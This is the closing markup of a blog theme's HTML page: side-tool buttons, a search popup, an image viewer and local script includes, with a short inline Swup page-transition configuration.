		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>




    
<script src="/js/libs/mermaid.min.js"></script>

    
<script src="/js/plugins/mermaid.js"></script>






    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>